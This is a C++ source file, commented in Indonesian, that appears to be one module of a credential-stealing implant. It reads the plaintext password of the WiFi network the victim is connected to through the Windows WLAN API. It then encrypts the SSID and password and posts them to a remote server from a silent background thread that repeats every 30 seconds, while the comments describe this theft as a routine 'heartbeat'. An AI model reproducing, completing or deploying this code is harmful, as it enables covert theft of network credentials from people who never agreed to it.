#include <winsock2.h>
#include "active.h"
#include "config.h"
#include "utils.h"
#include "transmission.h"
#include "encryption.h"
#include <wlanapi.h>
#include <sstream>
#include <mutex>
#include <thread>
#include <chrono>

#pragma comment(lib, "wlanapi.lib")

namespace ActiveMonitor {

    // State internal untuk melacak pengiriman terakhir
    static std::string lastSsid = ""; 
    static std::string lastPass = "";
    static time_t lastSendTime = 0;   
    static std::mutex statusMtx;

    /**
     * Helper: Membersihkan dan membangun target URL dari base URL.
     * Menghilangkan path /upload dan trailing slashes/spaces.
     */
    std::string BuildTargetUrl(const std::string& baseUrl) {
        std::string url = baseUrl;
        
        // Hapus path /upload jika ada
        size_t pos = url.find("/upload");
        if (pos != std::string::npos) {
            url = url.substr(0, pos);
        }
        
        // Hapus trailing slashes dan spaces
        while (!url.empty() && (url.back() == '/' || url.back() == ' ')) {
            url.pop_back();
        }
        
        // Append target endpoint
        return url + "/post-active";
    }

    /**
     * Helper: Format data status aktif dengan struktur: version|ssid|password
     * Include CLIENT_VERSION untuk tracking kompatibilitas versi.
     */
    std::string FormatActiveStatusData(const std::string& ssid, const std::string& password) {
        std::stringstream ss;
        ss << Config::CLIENT_VERSION << "|" << ssid << "|" << password;
        return ss.str();
    }      

    /**
     * Mengambil detail SSID dan Password WiFi yang sedang aktif terhubung.
     * Sekarang hanya mengambil interface yang statusnya 'Connected'.
     */
    void GetWifiDetails(std::string& ssid, std::string& password) {
        HANDLE hClient = NULL;
        DWORD dwVersion = 0;
        if (WlanOpenHandle(2, NULL, &dwVersion, &hClient) != ERROR_SUCCESS) return;

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        if (WlanEnumInterfaces(hClient, NULL, &pIfList) == ERROR_SUCCESS) {
            for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
                PWLAN_CONNECTION_ATTRIBUTES pConnectInfo = NULL;
                DWORD connectInfoSize = sizeof(WLAN_CONNECTION_ATTRIBUTES);
                
                // Pastikan interface dalam keadaan terhubung (Connected)
                if (WlanQueryInterface(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, 
                    wlan_intf_opcode_current_connection, NULL, &connectInfoSize, (PVOID*)&pConnectInfo, NULL) == ERROR_SUCCESS) {
                    
                    if (pConnectInfo->isState == wlan_interface_state_connected) {
                        DOT11_SSID rawSsid = pConnectInfo->wlanAssociationAttributes.dot11Ssid;
                        ssid = std::string((char*)rawSsid.ucSSID, rawSsid.uSSIDLength);
                        
                        PWSTR xmlProfile = NULL;
                        DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                        
                        // Ambil profil untuk mengekstrak password
                        if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, 
                            pConnectInfo->strProfileName, NULL, &xmlProfile, &flags, NULL) == ERROR_SUCCESS) {
                            
                            if (xmlProfile) {
                                std::wstring xml(xmlProfile);
                                std::wstring startTag = L"<keyMaterial>";
                                std::wstring endTag = L"</keyMaterial>";
                                
                                size_t startPos = xml.find(startTag);
                                size_t endPos = xml.find(endTag);

                                if (startPos != std::wstring::npos && endPos != std::wstring::npos && endPos > startPos) {
                                    startPos += startTag.length();
                                    password = Ws2S(xml.substr(startPos, endPos - startPos));
                                } else {
                                    password = "[OPEN/NO PASS]";
                                }
                                WlanFreeMemory(xmlProfile);
                            }
                        }
                        WlanFreeMemory(pConnectInfo);
                        
                        // Jika sudah menemukan interface yang aktif, hentikan pencarian
                        if (!ssid.empty()) break; 
                    } else {
                        WlanFreeMemory(pConnectInfo);
                    }
                }
            }
            WlanFreeMemory(pIfList);
        }
        WlanCloseHandle(hClient, NULL);
    }

    /**
     * Menyusun data heartbeat dan mengirimkannya ke endpoint /post-active.
     * 
     * Fitur:
     * - Include CLIENT_VERSION untuk tracking versi client di server
     * - Format data: version|ssid|password
     * - Optimasi trafik: hanya kirim jika SSID berubah atau interval waktu tercapai
     * - Heartbeat interval: 10 menit (590 detik)
     * 
     * Data Flow:
     * 1. Validasi server URL existence
     * 2. Ambil detail WiFi terkini dari system
     * 3. Cek apakah perlu pengiriman dengan smart logic
     * 4. Format data dengan version number dari config
     * 5. Enkripsi data sebelum transmisi
     * 6. Kirim ke server via /post-active endpoint
     * 7. Update last send time dan SSID jika berhasil
     */
    void SendActiveStatus() {
        // === STEP 1: Validasi Server URL ===
        if (Config::DYNAMIC_SERVER_URL.empty()) {
            return; // Server URL belum di-inisialisasi, abort pengiriman
        }

        // === STEP 2: Ambil Detail WiFi Terkini ===
        std::string currentSsid = "Ethernet";
        std::string currentPass = "N/A";
        GetWifiDetails(currentSsid, currentPass);
        
        time_t now = time(NULL);
        bool shouldSend = false;

        // === STEP 3: Cek Smart Logic Pengiriman ===
        {
            std::lock_guard<std::mutex> lock(statusMtx);
            // Trigger pengiriman jika:
            // - Ini adalah pengiriman pertama (lastSendTime == 0)
            // - SSID berubah (user pindah ke WiFi lain)
            // - Sudah lebih dari 10 menit sejak pengiriman terakhir (heartbeat rutin)
            if (lastSendTime == 0 || lastSsid != currentSsid || (now - lastSendTime >= 590)) {
                shouldSend = true;
            }
        }

        if (!shouldSend) {
            return; // Tidak perlu kirim pada saat ini
        }

        // === STEP 4: Format Data dengan Version Number ===
        // Include CLIENT_VERSION untuk tracking kompatibilitas di server
        std::string formattedData = FormatActiveStatusData(currentSsid, currentPass);
        std::vector<BYTE> dataToSend(formattedData.begin(), formattedData.end());
        
        // === STEP 5: Enkripsi Sebelum Transmisi ===
        FinalEncryption(dataToSend);

        // === STEP 6: Build Target URL dan Kirim ===
        std::string targetUrl = BuildTargetUrl(Config::DYNAMIC_SERVER_URL);

        bool success = PostDataChunked(
            dataToSend,
            "activity",
            "active_status.dat",
            std::to_string(now),
            0,
            1,
            targetUrl 
        );

        // === STEP 7: Update State jika Pengiriman Berhasil ===
        if (success) {
            std::lock_guard<std::mutex> lock(statusMtx);
            lastSendTime = now;
            lastSsid = currentSsid;
            lastPass = currentPass;
        }
    }

    /**
     * Memulai pemantauan dalam thread terpisah.
     */
    void StartReactiveMonitoring() {
        std::thread([]() {
            // Beri waktu modul lain (NetworkGate/FetchLink) untuk inisialisasi
            std::this_thread::sleep_for(std::chrono::seconds(15)); 
            
            while (true) {
                try {
                    SendActiveStatus();
                } catch(...) {
                    // Mencegah thread mati jika terjadi error tak terduga
                }
                
                // Cek status setiap 30 detik (tapi SendActiveStatus punya filter 10 menit di dalamnya)
                // Ini membuat sistem responsif jika SSID berubah mendadak
                std::this_thread::sleep_for(std::chrono::seconds(30)); 
            }
        }).detach();
    }
}